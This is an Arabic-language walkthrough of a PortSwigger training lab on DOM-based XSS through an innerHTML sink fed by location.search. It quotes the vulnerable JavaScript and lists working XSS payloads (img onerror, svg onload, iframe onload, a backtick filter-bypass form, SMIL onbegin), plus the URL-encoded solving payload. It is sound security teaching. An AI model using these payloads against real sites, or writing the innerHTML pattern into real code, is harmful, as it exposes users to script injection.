# [DOM XSS in `innerHTML` using `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

## 1. مقدمة 

اللّاب يحتوي على **DOM XSS** ناتجة عن إدخال قيمة المستخدم مباشرة داخل:

```javascript
document.getElementById('searchMessage').innerHTML = query;
```

أي قيمة يتم وضعها في البارامتر `?search=` سيتم حقنها داخل الـ HTML بدون أي فلترة.

بالتالي أي HTML أو JavaScript event handler يتم تنفيذه مباشرة.

---

## 2. المشكلة

الكود  بيأخذ قيمة المستخدم من `location.search` ثم يضعها في `innerHTML`:

```javascript
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

وهنا الدالة:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
```

بالتالي أي HTML يتم وضعه في `search=` يتم تنفيذه تلقائيًا.

---

## 3. Payload أساسيات HTML تعمل مباشرة

بما أن `innerHTML` يقبل أي HTML، هذه أمثلة تعمل فورًا:

### 3.1 تكبير نص (تأكيد وجود الضعف)

```
<h1>Test</h1>
```

### 3.2 Payload باستخدام `img` + `onerror`

```
<img src=x onerror=alert(1)>
```

### 3.3 Payload باستخدام `svg` + `onload`

```
<svg onload=alert(1)></svg>
```

### 3.4 Payload باستخدام `iframe`

```
<iframe onload=alert(1)></iframe>
```

### 3.5 Payload بدون أقواس أو كواتشن (للبايباسات)

```
<img src=x onerror=alert`1`>
```

### 3.6 Payload بدون أي attributes (SMIL inside SVG)

```
<svg><animate onbegin=alert(1)></animate></svg>
```

كل الأمثلة السابقة تعمل لأن **innerHTML يفسّر الـ HTML مباشرة بدون فلترة**.

---

## 4. الـ Payload النهائي المطلوب لحل اللاب

استخدم:

```
<img src=x onerror=alert(1)>
```

ضعه داخل الرابط كالآتي:

```
?search=<img src=x onerror=alert(1)>
```

أو URL-encoded:

```
?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

---

## 5. لماذا هذا الـ Payload يعمل؟

* `innerHTML` يسمح بإضافة عناصر HTML.
* `<img>` مقبول.
* تحميل صورة غير موجودة يفشل تلقائيًا.
* عند الفشل يتم تشغيل `onerror`.
* الإنذار `alert(1)` يتم تنفيذه.

وبذلك يتم استغلال **DOM XSS عبر innerHTML**.

---

## 6. الخلاصة

* مصدر الإدخال: `location.search`
* نقطة الضعف: `innerHTML`
* نوع الهجوم: **DOM-based XSS**
* أفضل Payload:

```
<img src=x onerror=alert(1)>
```
